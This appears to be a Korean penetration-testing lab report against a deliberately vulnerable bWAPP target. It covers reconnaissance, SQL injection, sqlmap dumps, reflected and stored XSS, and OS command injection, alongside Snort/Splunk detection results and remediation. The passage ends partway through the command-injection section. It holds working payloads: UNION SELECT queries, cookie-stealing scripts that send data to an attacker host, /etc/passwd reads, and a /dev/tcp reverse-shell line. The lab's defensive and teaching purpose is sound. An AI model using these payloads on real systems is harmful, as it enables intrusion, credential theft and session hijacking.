# Phase 1. 공격 수행

> att-mint(10.50.50.17) → pfSense NAT → Bee-box(10.0.10.50)

---

## 사전 준비

### 도구 설치 (att-mint)

```bash
sudo apt update
sudo apt install -y nmap nikto dirb hydra curl
# sqlmap
sudo apt install -y sqlmap
```

### 접속 확인

```bash
# pfSense NAT를 통해 Bee-box 웹서버 접근
curl -I http://10.0.0.254

# 직접 접근 (DMZ 내부 경로)
ping 10.0.10.50
```

### bWAPP 설정

1. http://10.0.0.254/bWAPP/ 접속
2. bee / bug 로그인
3. Security Level → **low** 설정

---

## 정찰 단계 (Reconnaissance)

> **정찰이란?** 공격 대상의 정보를 모아 "무엇을 어떻게 공격할지" 정하기 위한 사전 조사 단계.
> 아래 4단계는 **넓게 → 좁게**, **네트워크 → 서비스 → 웹설정 → 애플리케이션** 순으로 정보를 좁혀간다.

### 정찰 요약 — 무엇을, 왜 정찰했나

| 단계 | 도구 | 무엇을 정찰 | 왜 (목적) | 얻은 정보 → 다음 단계 |
|------|------|------------|-----------|----------------------|
| R-1 | `nmap -sS` | 열린 포트 / 공격표면 | 어디로 들어갈 수 있나(진입점) | 80/tcp만 열림 → 웹이 유일 표적 |
| R-2 | `nmap -sV` | 서비스·버전 | 무슨 SW 몇 버전인가(취약점 연결) | Apache 2.2.8·PHP 5.2.4(EOL) → CVE 후보 |
| R-3 | `nikto` | 웹서버 취약점·설정 | 웹서버 레벨 약점(설정·기본파일·헤더) | TRACE·phpMyAdmin·CVE-2002-0082 |
| R-4 | `dirb` | 숨은 경로·파일 | 앱 레벨 진입점(관리페이지·설치앱) | /drupal·/phpmyadmin·/webdav |

### 정찰의 논리 (왜 이 순서인가)

1. **R-1 포트스캔** — 가장 먼저 "무엇이 열려 있나". 열린 포트 = 공격 진입점.
   대상은 **80(HTTP)만** 열려 있어 → 이후 모든 공격을 **웹**에 집중.
2. **R-2 버전탐지** — 열린 서비스가 "무엇의 몇 버전인지". 구버전이면 알려진 취약점(CVE)으로 직결.
   → Apache 2.2.8·PHP 5.2.4·OpenSSL 0.9.8g 전부 EOL.
3. **R-3 웹 스캔(nikto)** — 웹서버 "설정·구성" 레벨 약점을 자동 점검(수천 요청). TRACE·기본파일·헤더 부재·관리도구 노출.
4. **R-4 디렉토리 탐색(dirb)** — 링크에 안 드러나는 "숨은 경로·설치앱"을 워드리스트로 발굴. 관리자 페이지·Drupal·백업파일 = 추가 공격면.

→ **포트(어디로) → 버전(무엇을) → 웹설정(어떤 약점) → 숨은경로(추가 진입점)** 순으로 공격 지도를 완성.
   이 정보로 다음의 웹 공격(E-1~E-7) 대상을 정한다.

### 방어·탐지 관점 요약

- 정찰은 **대량·비정상 트래픽**이라 IPS(Snort)로 잘 탐지됨: 포트스캔=`sfPortscan`, 웹 스캔=다수 `ET WEB_SERVER` 룰, 민감파일 탐색=`GPL WEB_SERVER` 룰.
- 방어 권고: 불필요 포트/서비스 차단, 버전 배너 최소화, 디렉토리 인덱싱·기본파일·관리도구 노출 제거, 스캔성 트래픽 rate-limit.
- 관제 포인트: 짧은 시간에 **동일 출발지(10.50.50.17)에서 대량 요청·다수 시그니처** = 정찰 징후 → 조기 차단 근거.

---

### R-1. TCP 포트 스캔

```bash
# pfSense가 WAN ICMP를 차단하므로 -Pn(핑 생략) 필요
sudo nmap -sS -Pn -p 1-1000 10.0.0.254 -oN scan_tcp.txt
```

- 목적: 열린 포트/서비스 파악
- 예상 결과: 80/tcp open (HTTP)
- Snort 예상 탐지: sfPortscan

**결과:** ✅ (2026-08-03 19:50 KST)

```
Nmap scan report for 10.0.0.254
Host is up (0.0023s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE
80/tcp open  http
Nmap done: 1 IP address (1 host up) scanned in 19.62 seconds
```

- 열린 포트: **80/tcp (HTTP)** — 나머지 999개는 `filtered`(pfSense가 드롭)
- 공격자 IP: **10.50.50.17** (NAT로 가려지지 않고 원본 그대로 로깅됨)
- **Snort 탐지 성공** — Splunk `index=pfsense`에서 확인:
  ```
  snort[86242]: [122:5:1] (portscan) TCP Filtered Portscan
  [Classification: Attempted Information Leak] [Priority: 2] 10.50.50.17 -> 10.0.0.254
  ```
- 특이사항: pfSense 방화벽은 통과/차단 SYN을 기본 로깅하지 않아, **포트스캔 탐지는 Snort sfPortscan이 담당**함을 확인 (방화벽 로그가 아닌 IPS 계층 탐지).

**스크린샷:**

![R-1 nmap 스캔 결과](images/R-1-nmap.png)
![R-1 Snort 포트스캔 탐지 (Splunk)](images/R-1-snort-splunk.png)

### R-2. 서비스 버전 탐지

```bash
sudo nmap -sV -Pn 10.0.0.254 -oN scan_version.txt
```

- 목적: OS, 웹서버 버전 식별
- 예상 결과: Apache, PHP 버전 등

**결과:** ✅ (2026-08-03 19:58 KST)

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2 mod_fastcgi/2.4.6
                     PHP/5.2.4-2ubuntu5 with Suhosin-Patch mod_ssl/2.2.8 OpenSSL/0.9.8g)
```

- 식별된 버전 (전부 EOL·구버전 → 정보 노출):
  - **Apache httpd 2.2.8**, **PHP 5.2.4**, mod_ssl 2.2.8, **OpenSSL 0.9.8g**, mod_fastcgi 2.4.6
- 컨설팅 관점: 버전 배너를 그대로 노출 → 알려진 CVE 매핑 근거 (**V-07 정보 노출**)
- 탐지: 단일 열린 포트(80) 대상 버전 프로브라 별도 IPS 경보는 미미 — R-1 스캔과 함께 정찰 트래픽으로 묶임

**스크린샷:**

![R-2 nmap 버전 탐지 결과](images/R-2-nmap-version.png)

### R-3. 웹 취약점 스캔

```bash
nikto -h http://10.0.0.254 -o nikto_result.txt
```

- 목적: 웹서버 취약점 자동 탐색
- Snort 예상 탐지: ET SCAN Nikto Web App Scanner

**결과:** ✅ (2026-08-03 20:01 KST)

nikto 주요 발견 (6544개 점검, 21개 보고):
- 서버 버전 노출: Apache 2.2.8 / PHP 5.2.4 (전부 outdated)
- **HTTP TRACE 활성** → XST 취약 (OSVDB-877)
- **CVE-2002-0082** (mod_ssl 2.2.8 / OpenSSL 0.9.8g 원격 버퍼 오버플로우)
- **phpMyAdmin 노출** (`/phpmyadmin/`, `changelog.php`) — 관리도구 외부 접근 가능
- `/icons/` **디렉토리 인덱싱** 활성
- 기본 파일 노출: `/README`, `/INSTALL.txt`
- 보안 헤더 부재: X-Frame-Options 없음, phpMyAdmin 쿠키 HttpOnly 없음

**Snort 탐지 성공** — nikto 스캔이 15분간 Splunk에 **868 이벤트** 유발. 대표 시그니처:
```
ET WEB_SERVER /etc/passwd Detected in URI    [Attempted Information Leak]
ET WEB_SERVER /etc/shadow Detected in URI    [Attempted Information Leak]
(http_inspect) WEBROOT DIRECTORY TRAVERSAL
ET WEB_SERVER WEB-PHP phpinfo access         [Information Leak]
ET WEB_SERVER Script tag in URI Possible XSS Attempt   [Web Application Attack]
ET WEB_SERVER Exploit Suspected PHP Injection Attack (cmd=)
ET WEB_SPECIFIC_APPS ... Remote File Inclusion Attempt
```
- 예상(ET SCAN Nikto)보다 훨씬 풍부 — nikto의 각 프로브가 개별 웹공격 시그니처를 다량 트리거
- 컨설팅 관점: TRACE·디렉토리 인덱싱·기본파일·헤더부재 → **V-08 보안설정 미흡**, phpMyAdmin·phpinfo 노출 → **V-07 정보노출**

**스크린샷:**

![R-3 nikto 결과](images/R-3-nikto.png)
![R-3 Snort 웹공격 탐지 (Splunk)](images/R-3-snort-splunk.png)

### R-4. 디렉토리 브루트포스

```bash
dirb http://10.0.0.254 -o dirb_result.txt
```

- 목적: 숨겨진 경로/파일 탐색

**결과:** ✅ (2026-08-03 20:05 KST)

dirb 발견 (4612 단어 점검, 20개 발견):
- **디렉토리/파일 노출**: `/drupal/`(Drupal 앱 — /install·/LICENSE·/modules 등), `/phpmyadmin/`, `/webdav/`, `/server-status`(Apache 상태페이지), `/README`, `/crossdomain.xml`
- 다수 디렉토리 **LISTABLE(디렉토리 인덱싱 활성)** — /drupal/modules·/profiles·/scripts·/sites·/themes, /phpmyadmin/js·/libraries 등
- `/drupal/cron` → 403

**Snort 탐지 성공** — dirb의 민감 파일 탐색을 GPL WEB_SERVER 룰이 다수 탐지:
```
GPL WEB_SERVER .htpasswd access        [Web Application Attack]
GPL WEB_SERVER .htaccess access        [Attempted Information Leak]
GPL WEB_SERVER /~root access
GPL WEB_SERVER printenv access
GPL WEB_SERVER global.asa access
GPL WEB_SERVER iisadmin access
GPL WEB_SERVER 403 Forbidden
ET WEB_SERVER WEB-PHP phpinfo access
```
- 참고: 사전조사에서 "dirb는 탐지가 약할 수 있다"고 봤으나 **실제로는 민감파일 접근 시그니처로 잘 탐지됨** (예상 대비 좋은 결과 — 문서 갱신 포인트)
- 컨설팅 관점: 디렉토리 인덱싱·server-status·phpMyAdmin·webdav·Drupal 노출 → **V-08 보안설정 미흡 / V-07 정보노출**

**스크린샷:**

![R-4 dirb 결과](images/R-4-dirb.png)
![R-4 Snort 탐지 (Splunk)](images/R-4-snort-splunk.png)

---

## 웹 공격 단계 (Exploitation)

> **정찰에서 공격으로** — R-1~R-4에서 확인한 사실: 80/tcp만 열림, Apache 2.2.8 / PHP 5.2.4(EOL), bWAPP 동작 중, Drupal·phpMyAdmin·WebDAV 노출.
> 이 정보를 바탕으로 실제 취약점을 악용(exploit)하여 **데이터 탈취·세션 장악·시스템 명령 실행**을 시도한다.

### 웹 공격의 분류 — 7가지 공격의 전체 그림

| 분류 | 공격 | 조작 대상 | 최종 영향 | 위험도 | OWASP 2021 | CWE |
|------|------|-----------|-----------|--------|------------|-----|
| **서버측 주입** | E-1/E-2 SQLi | SQL 쿼리 | DB 전체 유출·변조 | Critical | A03 Injection | CWE-89 |
| | E-5 Command Injection | OS 셸 명령 | 서버 시스템 장악 | Critical | A03 Injection | CWE-78 |
| **클라이언트측 주입** | E-3 Reflected XSS | HTML/JS 응답 | 특정 피해자 세션 탈취 | High | A03 Injection | CWE-79 |
| | E-4 Stored XSS | 저장된 HTML/JS | 모든 방문자 세션 탈취 | Critical | A03 Injection | CWE-79 |
| **접근 제어 우회** | E-6 Directory Traversal | 파일 경로 | 시스템 파일 노출 | High | A01 Broken Access Control | CWE-22 |
| **인증 공격** | E-7 Brute Force | 로그인 자격증명 | 계정 탈취 | High | A07 Auth Failures | CWE-307 |

### 공격 간 연계도 — 왜 이 순서인가

```
정찰(R-1~R-4) — 열린 포트·버전·경로 파악 완료
    │
    ├→ E-1/E-2 SQLi ── DB에서 계정·해시 탈취 → 인증 정보 확보
    │       └→ sqlmap 자동화로 전체 DB 덤프 + 해시 크랙
    ├→ E-3 Reflected XSS ── 피해자 클릭 유도 → 세션 쿠키 탈취
    ├→ E-4 Stored XSS ──── 게시글에 저장 → 모든 방문자 쿠키 자동 탈취
    │       └→ IPS 미탐지 발견 (POST body 경유 → Snort URI 검사 우회)
    ├→ E-5 Command Injection ── 서버 OS 명령 실행 → 시스템 장악
    │       └→ 리버스쉘 → 권한상승 → 내부망 침투 (실무 킬체인)
    ├→ E-6 Directory Traversal ── 시스템 파일 열람 → 추가 정보 수집
    └→ E-7 Brute Force ── 사전 대입으로 계정 탈취 → 정상 사용자 위장
```

> **IPS 탐지 패턴 핵심 발견 (실습에서 도출한 인사이트):**
> - **GET 파라미터(URI)** 경유 공격 → Snort 탐지 **잘 됨** (E-1 SQLi, E-3 Reflected XSS)
> - **POST body** 경유 공격 → 요청측 탐지 **못 함** (E-4 Stored XSS, E-5 Command Injection)
> - **응답(Response)** 에 민감정보 포함 → 일부 응답측 룰로 포착 (E-5 `/etc/passwd` 응답)
> → **네트워크 IPS의 구조적 한계** = Phase 2 보고서의 핵심 논점

---

### E-1. SQL Injection (수동)

#### 개념 상세 — SQL Injection이란

**SQL Injection(SQLi)** 은 웹 애플리케이션이 사용자 입력을 SQL 쿼리 문자열에 직접 이어붙일(concatenation) 때 발생한다. 공격자가 SQL 구문을 삽입하면 **쿼리의 논리 구조 자체가 변조**되어, 개발자가 의도하지 않은 동작이 실행된다.

**취약한 코드 vs 안전한 코드:**

```php
// ❌ 취약한 코드 (bWAPP sqli_1.php의 구조)
$sql = "SELECT * FROM movies WHERE title LIKE '%" . $_GET['title'] . "%'";

// 사용자가 iron 입력 → 정상 동작:
//   SELECT * FROM movies WHERE title LIKE '%iron%'

// 공격자가 ' OR '1'='1 입력 → SQL 구조 변조:
//   SELECT * FROM movies WHERE title LIKE '%' OR '1'='1%'
//   → WHERE 조건이 항상 참 → 테이블 전체 데이터 반환

// ✅ 안전한 코드 (Prepared Statement / 파라미터 바인딩)
$stmt = $pdo->prepare("SELECT * FROM movies WHERE title LIKE ?");
$stmt->execute(['%' . $_GET['title'] . '%']);
// → 입력값이 "데이터"로만 취급됨, SQL 구문으로 해석 불가
```

**SQLi의 단계적 위험 확대:**

| 단계 | 기법 | 영향 | 이번 실습 |
|------|------|------|-----------|
| 1단계 | 인증 우회 (`' OR '1'='1`) | 로그인 없이 접근 | ✅ 전체 목록 반환 |
| 2단계 | 데이터 추출 (`UNION SELECT`) | 다른 테이블의 민감 데이터 탈취 | ✅ users 테이블 해시 유출 |
| 3단계 | 권한 상승 | DB 관리자 권한 획득, 데이터 변조·삭제 | — (미실습) |
| 4단계 | OS 명령 실행 (`INTO OUTFILE`, `xp_cmdshell`) | 서버 장악 (SQLi만으로 RCE 달성) | — (미실습) |

**SQLi 유형 분류:**

| 유형 | 방법 | 특징 | 이번 실습 |
|------|------|------|-----------|
| **In-band (Classic)** | 쿼리 결과가 화면에 직접 표시 | 가장 직관적, 빠른 추출 | ✅ UNION SELECT |
| **Error-based** | DB 에러 메시지에서 정보 추출 | 에러 숨김 시 불가 | ✅ SQL 에러 노출 확인 |
| **Blind (Boolean)** | 참/거짓에 따른 응답 차이로 한 비트씩 추론 | 느리지만 에러 없이도 가능 | sqlmap이 자동 사용 |
| **Blind (Time)** | `SLEEP(5)` 등 응답 시간 차이로 추론 | 가장 느리지만 확실 | sqlmap이 자동 사용 |
| **Out-of-band** | DNS/HTTP 등 외부 채널로 데이터 유출 | 방화벽 우회 가능 | — (미실습) |

> **CWE-89: Improper Neutralization of Special Elements used in an SQL Command**
> OWASP 2021 A03 Injection — 2017년까지 OWASP Top 10에서 **10년간 1위**를 차지했고, 2021년에도 3위를 유지하는 가장 대표적인 웹 취약점이다. 단순 데이터 유출에서 서버 장악까지 확대 가능하여 위험도 **Critical**로 분류된다.

**bWAPP 메뉴:** SQL Injection (GET/Search)

```
# 인증 우회
' OR 1=1--

# 데이터 추출
' UNION SELECT 1,login,password,4,5,6,7 FROM users--
```

- Snort 예상 탐지: ET WEB_SERVER SQL Injection Attempt

**결과:** ✅ (2026-08-04 09:29 KST)

**공격 페이로드 & 결과:**
- Boolean SQLi: `' OR '1'='1` → 검색 결과에 **전체 영화 목록** 반환 (쿼리 구조 변조 확인)
- UNION 데이터 추출: `' UNION SELECT 1,login,password,4,5,6,7 FROM users-- -`
  → users 테이블 **계정·비밀번호 해시 유출**:
  ```
  A.I.M.  6885858486f31043e5839c735d99457f045affd0
  bee     6885858486f31043e5839c735d99457f045affd0
  foo     0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33
  ```
  (SHA1 해시 — 예: `6885...affd0` = "bug")

**Snort 탐지 성공** (Splunk `index=pfsense 10.50.50.17`, 4건):
```
ET WEB_SERVER SELECT USER SQL Injection Attempt in URI  [Web Application Attack, P1]  10.50.50.17 -> 10.0.0.254:80
ET WEB_SERVER SQL Errors in HTTP 200 Response (error in your SQL syntax)  [P2]  10.0.0.254:80 -> 10.50.50.17
```
- 공격 요청(SQLi in URI) + 서버 응답의 SQL 에러 노출까지 **양방향 탐지**
- 컨설팅 관점: 인증우회·전체 DB 유출 → **V-01 SQL Injection (Critical)**. 개선: Prepared Statement·입력검증·에러 숨김·DB 최소권한

**스크린샷:**

![E-1 SQLi UNION 데이터 추출](images/E-1-sqli.png)
![E-1 Snort SQLi 탐지 (Splunk)](images/E-1-snort-splunk.png)

### E-2. SQL Injection (sqlmap 자동화)

#### 수동(E-1) vs 자동화(E-2) — 왜 둘 다 하는가

| 항목 | E-1 수동 | E-2 sqlmap 자동화 |
|------|---------|------------------|
| **목적** | 취약점 원리 이해·증명 | 전체 DB 체계적 덤프 |
| **장점** | 정밀 제어, 원리 학습 | 속도, 완전성, 해시 자동 크랙 |
| **Snort 탐지** | 4건 (소량, 은밀) | 211건 (대량, 명백) |
| **실제 공격자** | 먼저 구조를 파악 | 파악 후 자동화로 전환 |
| **관제 관점** | 정상 트래픽에 묻힐 수 있음 | 도구 시그니처 + 트래픽 폭증 → 즉시 탐지 |

> **sqlmap의 동작 원리:** sqlmap은 단순 반복 도구가 아니다. 대상 파라미터에 다양한 SQLi 페이로드(boolean, error, time, UNION, stacked queries)를 자동으로 시도하여 주입 가능 여부를 판별한 뒤, DBMS 종류를 식별하고, DB→테이블→컬럼→데이터 순서로 체계적으로 추출한다. 해시가 발견되면 내장 사전으로 자동 크랙까지 수행한다.
>
> **관제 시사점:** 수동 SQLi(E-1)는 정상 검색 요청과 구별이 어려워 **오탐/정탐 판단**이 중요하고, sqlmap(E-2)은 `User-Agent: sqlmap/1.x`와 트래픽 폭증만으로 **자동 차단 근거**가 명확하다. 실제 공격자는 수동으로 구조를 파악한 뒤 자동화 도구로 전환하는 패턴이 일반적이다.

```bash
# DB 목록 추출
sqlmap -u "http://10.0.0.254/bWAPP/sqli_1.php?title=test&action=search" \
  --cookie="PHPSESSID=<세션값>;security_level=0" \
  --dbs

# 테이블 추출
sqlmap -u "..." --cookie="..." -D bWAPP --tables

# 데이터 덤프
sqlmap -u "..." --cookie="..." -D bWAPP -T users --dump
```

- Snort 예상 탐지: ET WEB_SERVER sqlmap User Agent

**결과:** ✅ (2026-08-04 09:37 KST)

**sqlmap 자동 공격 결과:**
- 주입점: `title` 파라미터 — boolean/error/time-based/UNION(7컬럼) 모두 injectable, DBMS = MySQL (133회 요청으로 자동 탐지)
- DB 목록: **bWAPP, drupageddon, information_schema, mysql** (4개)
- users 테이블 덤프 + **해시 자동 크랙**:
  ```
  id  login   password(SHA1)                              admin  cracked
  1   A.I.M.  6885858486f31043e5839c735d99457f045affd0    1      bug
  2   bee     6885858486f31043e5839c735d99457f045affd0    1      bug
  3   foo     0beec7b5ea3f0fdbc95d0dd47f3c5bc275da8a33    0      foo
  ```

**Snort 탐지 성공** (Splunk `index=pfsense 10.50.50.17`, 15분간 **211 이벤트**):
```
ET SCAN Sqlmap SQL Injection Scan                            [Attempted Information Leak]  ← sqlmap 도구 식별
ET WEB_SERVER SELECT USER SQL Injection Attempt in URI       [Web Application Attack, P1]
ET WEB_SERVER Possible SQL Injection SELECT CAST in HTTP URI [Administrator Privilege Gain]
ET WEB_SERVER Possible MySQL SQLi Attempt Information Schema Access
ET WEB_SERVER ATTACKER SQLi - SELECT and Schema Columns
ET WEB_SERVER Possible Attempt to Get SQL Server Version (SELECT VERSION)
```
- 수동(E-1) 4건 ↔ 자동(E-2) **211건** — 자동화 도구는 트래픽·시그니처가 폭증해 **탐지가 매우 쉬움**
- 관제 관점: `ET SCAN Sqlmap` = 자동화 공격도구 사용의 명확한 지표 → 즉시 차단 근거
- 컨설팅 관점: E-1과 동일 **V-01 SQL Injection (Critical)**

**스크린샷:**

![E-2 sqlmap DB 덤프](images/E-2-sqlmap.png)
![E-2 Snort sqlmap 탐지 (Splunk)](images/E-2-snort-splunk.png)

### E-3. Reflected XSS

#### 개념 상세 — XSS(Cross-Site Scripting)란

**XSS**는 웹 페이지에 악성 스크립트를 주입하여 **피해자의 브라우저에서 실행**시키는 공격이다. SQL Injection이 서버(DB)를 공격한다면, XSS는 **클라이언트(브라우저)를 공격**한다.

**왜 위험한가 — 브라우저의 신뢰 모델:**

브라우저는 **동일 출처 정책(Same-Origin Policy)** 에 따라 특정 도메인에서 온 스크립트를 해당 도메인의 정당한 코드로 신뢰한다. XSS로 주입된 악성 스크립트는 **정상 스크립트와 동일한 권한**을 가지므로:
- `document.cookie`로 세션 쿠키(PHPSESSID) 읽기 → **세션 하이재킹** (공격자가 피해자로 로그인)
- DOM 조작으로 로그인 폼을 변조 → **자격증명 피싱** (ID/PW를 공격자 서버로 전송)
- AJAX 요청으로 피해자 권한의 작업 수행 → **CSRF와 유사한 효과** (비밀번호 변경, 게시글 작성 등)
- 키로거 삽입 → 피해자의 **모든 입력 감시** (개인정보·카드번호 탈취)

**Reflected(반사형) XSS의 동작 원리:**

```
① 공격자: 악성 링크 제작
   http://target.com/search?q=<script>document.location='http://공격자/steal?c='+document.cookie</script>

② 공격자 → 피해자에게 링크 전달 (이메일, SNS, 게시판)
   "검색 결과를 확인하세요" (사회공학)

③ 피해자가 링크 클릭 → 서버가 입력값을 그대로 응답에 포함
   <html>검색 결과: <script>document.location=...</script></html>

④ 피해자 브라우저에서 스크립트 실행 → 쿠키가 공격자 서버로 전송

⑤ 공격자: 탈취한 세션 ID로 피해자 계정에 접근 (세션 하이재킹)
```

**Reflected vs Stored XSS 비교:**

| 구분 | Reflected (E-3) | Stored (E-4) |
|------|----------------|--------------|
| 지속성 | **1회성** — 링크 클릭 시만 실행 | **영구적** — DB에 저장, 매번 실행 |
| 피해 범위 | 링크를 클릭한 **특정 사용자** | 페이지를 방문하는 **모든 사용자** |
| 공격 조건 | 피해자를 링크로 **유도**해야 함 (사회공학) | 한 번 저장하면 **자동** 실행 |
| 전달 경로 | GET 파라미터 **(URI에 노출)** | POST body → DB → 응답 body |
| IPS 탐지 | ✅ URI 검사 룰로 탐지 가능 | ❌ POST/응답 body는 미탐지 |
| 위험도 | High | **Critical** (다수 피해 + 탐지 회피) |

> **CWE-79: Improper Neutralization of Input During Web Page Generation**
> OWASP 2021 A03 Injection에 포함. OWASP에 따르면 전체 웹 애플리케이션의 약 2/3가 XSS에 취약하며, 가장 흔한 웹 취약점 중 하나다.
> 핵심 방어: **출력 인코딩(htmlspecialchars 등 컨텍스트별 이스케이프)**, CSP(Content Security Policy) 헤더, 쿠키 HttpOnly 플래그.

**bWAPP 메뉴:** XSS - Reflected (GET)

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
```

- Snort 예상 탐지: ET WEB_SERVER XSS Attempt

**결과:** ✅ (2026-08-04 10:03 KST)

**공격 페이로드 & 결과:**
- `<script>alert('XSS')</script>` → First name 입력 → alert 팝업에 **"XSS"** 출력 (스크립트 실행 확인)
- `<script>alert(document.cookie)</script>` → alert 팝업에 **쿠키 노출**:
  ```
  PHPSESSID=a28ff074423b11795c7461ff760cdac5; security_level=0
  ```
  → 세션 ID 탈취 가능 확인 (세션 하이재킹 위험)
- URL에 페이로드가 그대로 반영: `xss_get.php?firstname=<script>alert('XSS')</script>&lastname=...`

**Snort 탐지 성공** (Splunk `index=pfsense 10.50.50.17`, **3건**):
```
ET WEB_SERVER Script tag in URI Possible Cross Site Scripting Attempt
[Classification: Web Application Attack] [Priority: 1] [TCP] 10.50.50.17 -> 10.0.0.254:80
```
- 3회 시도(alert XSS, alert cookie, img onerror) 모두 `Script tag in URI` 룰로 탐지
- 컨설팅 관점: 입력값 무검증 반영 → **V-02 XSS (High)**. 개선: 출력 인코딩(htmlspecialchars), CSP 헤더, HttpOnly 쿠키

**스크린샷:**

![E-3 XSS alert 팝업](images/E-3-xss-alert.png)
![E-3 쿠키 탈취 확인](images/E-3-xss-cookie.png)
![E-3 Snort XSS 탐지 (Splunk)](images/E-3-snort-splunk.png)

### E-4. Stored XSS

#### 개념 상세 — Stored XSS의 위험성

**Stored(저장형) XSS**는 악성 스크립트가 **서버 DB에 저장**되어, 해당 페이지를 여는 **모든 사용자**에게 자동으로 실행되는 XSS의 가장 위험한 형태다.

**Reflected와의 핵심 차이:**
- Reflected: 공격자가 **매번 피해자를 악성 링크로 유도**해야 함 (사회공학에 의존)
- Stored: **한 번 저장하면 이후 방문자 전원이 자동 감염** (유도 불필요, 대규모 피해)

**Stored XSS 공격 흐름:**

```
① 공격자: Blog 게시글에 악성 스크립트 작성 후 Submit (POST 요청)
   <script>document.location='http://공격자서버/steal?c='+document.cookie</script>
                    ↓
② 서버: 입력 검증 없이 DB에 스크립트 그대로 저장
                    ↓
③ 일반 사용자 A가 Blog 페이지 방문
                    ↓
④ 서버: DB에서 게시글 조회 → 스크립트 포함된 HTML 응답 전송
                    ↓
⑤ 사용자 A의 브라우저: 스크립트 자동 실행 → 쿠키가 공격자 서버로 전송
                    ↓
⑥ 사용자 B, C, D... 도 방문할 때마다 같은 피해 반복
```

**실제 사례 — Samy Worm (2005, MySpace):**
Stored XSS가 **자기 복제 웜(worm)** 으로 발전한 대표 사례. MySpace 프로필에 저장된 XSS 코드가 프로필 방문자에게 자동 전파되어, 20시간 만에 **100만 명 이상이 감염**되었다. 방문만으로 자동 전파되는 특성 때문에 기하급수적으로 확산했으며, MySpace는 서비스를 일시 중단해야 했다.

**이번 실습의 핵심 발견 — IPS 탐지 한계:**

| 공격 | 페이로드 경로 | Snort 검사 범위 | 탐지 결과 |
|------|-------------|----------------|----------|
| E-3 Reflected XSS | GET 파라미터 → **URI** → 응답 | URI 검사 ✅ | **탐지 성공** (3건) |
| E-4 Stored XSS | **POST body** → DB → **응답 body** | URI만 검사 | **미탐지** ❌ |

→ Snort의 `Script tag in URI` 룰은 URI(URL)만 검사하므로, POST body로 전송되는 Stored XSS 페이로드를 탐지할 수 없다. 이는 네트워크 IPS의 **구조적 한계**이며, WAF(Web Application Firewall)나 **애플리케이션 레벨 방어**(출력 인코딩, CSP)가 필수적임을 보여준다.

**bWAPP 메뉴:** XSS - Stored (Blog)

```html
<script>document.location='http://10.50.50.17/steal?c='+document.cookie</script>
```

- 게시글에 저장되어 다른 사용자 접속 시 실행됨

**결과:** ✅ (2026-08-04 10:08 KST)

**공격 페이로드 & 결과:**
- Blog Entry에 `<script>alert(document.cookie)</script>` 입력 후 Submit
- 저장 즉시 alert 팝업에 **쿠키 노출**: `PHPSESSID=a28ff074423b11795c7461ff760cdac5; security_level=0`
- 페이지 새로고침(F5/Resend) → **다시 alert 실행** = DB에 저장된 스크립트가 매번 실행됨
- 다른 사용자가 Blog 페이지를 열 때마다 쿠키 탈취 가능 (Reflected보다 피해 범위 훨씬 넓음)
- Blog 테이블에 기록: Owner=bee, Date=2026-08-04 03:09:07 (서버 UTC 시각)

**Snort 탐지: ❌ 미탐지 (중요 발견)**
- Splunk `index=pfsense 10.50.50.17` 검색 결과, E-4 관련 새 이벤트 **0건**
- **미탐지 원인**: Stored XSS는 POST body로 페이로드를 전송하고, 이후 응답 body에 포함되어 실행됨. Snort의 `Script tag in URI` 룰은 **요청 URI만 검사**하므로 POST body/응답 body의 스크립트를 탐지하지 못함
- **Reflected vs Stored 탐지 차이**:
  - Reflected(E-3): 페이로드가 GET 파라미터(URI)에 노출 → Snort 탐지 ✅
  - Stored(E-4): 페이로드가 POST body → DB → 응답 body로 이동 → Snort 미탐지 ❌
- **관제 시사점**: 네트워크 IPS만으로는 Stored XSS를 탐지할 수 없음 → WAF(Web Application Firewall) 또는 애플리케이션 레벨 방어(출력 인코딩, CSP) 필요
- 컨설팅 관점: **V-02 XSS (Critical)** — Stored XSS는 Reflected보다 위험도 상향. IPS 탐지 우회 가능 + 다수 피해자 발생

**스크린샷:**

![E-4 Stored XSS 쿠키 탈취](images/E-4-xss-stored.png)
![E-4 재접속 시 재실행 확인](images/E-4-xss-resend.png)
![E-4 Snort 미탐지 확인 (Splunk)](images/E-4-snort-splunk.png)

### E-5. OS Command Injection

**bWAPP 메뉴:** OS Command Injection (`commandi.php`)

#### 개념 상세 — OS Command Injection이란

**Command Injection**은 웹 애플리케이션이 사용자 입력을 **OS 셸 명령의 일부로 실행**할 때 발생한다. SQL Injection이 DB를 장악한다면, Command Injection은 **서버 운영체제 자체를 장악**하는 공격으로, 웹 취약점 중 가장 위험한 부류에 속한다.

**취약한 코드의 원리:**

```php
// ❌ 취약한 코드 (bWAPP commandi.php의 구조)
$target = $_POST['target'];
$output = shell_exec("nslookup " . $target);

// 정상 입력: 127.0.0.1
//   실행: nslookup 127.0.0.1  ← DNS 조회만 수행

// 공격 입력: 127.0.0.1; whoami
//   실행: nslookup 127.0.0.1; whoami  ← 세미콜론이 명령을 분리
//   → nslookup 결과 + "www-data" 출력 = 임의 명령 실행 성공

// ✅ 안전한 코드
$output = gethostbyname($target);  // OS 명령 대신 PHP 내장 함수 사용
// 또는
$output = shell_exec("nslookup " . escapeshellarg($target));  // 셸 메타문자 이스케이프
```

**셸 메타문자의 종류와 의미:**

| 메타문자 | 의미 | 예시 |
|---------|------|------|
| `;` | 명령 구분 (앞 명령 성공/실패 무관) | `127.0.0.1; whoami` |
| `\|` | 파이프 (앞 명령의 출력을 뒤 명령의 입력으로) | `127.0.0.1 \| cat /etc/passwd` |
| `&&` | AND (앞 명령 성공 시에만 뒤 명령 실행) | `127.0.0.1 && id` |
| `\|\|` | OR (앞 명령 실패 시에만 뒤 명령 실행) | `invalid \|\| whoami` |
| `` ` `` | 백틱 (명령 치환) | `` 127.0.0.1 `whoami` `` |
| `$()` | 명령 치환 (POSIX) | `127.0.0.1 $(whoami)` |

**Command Injection이 특히 위험한 이유 — 공격 확대 경로:**

```
① whoami → www-data (웹서버 권한 확인)
② cat /etc/passwd → 시스템 계정 목록 확인
③ uname -a → 커널 버전 확인 → 커널 익스플로잇 검색
④ 리버스쉘 획득: bash -i >& /dev/tcp/공격자IP/4444 0>&1
⑤ 권한상승(Privilege Escalation): 커널 취약점 또는 SUID 바이너리 악용
⑥ 내부망 침투(Lateral Movement): 내부 네트워크 스캔 → 추가 시스템 장악
```

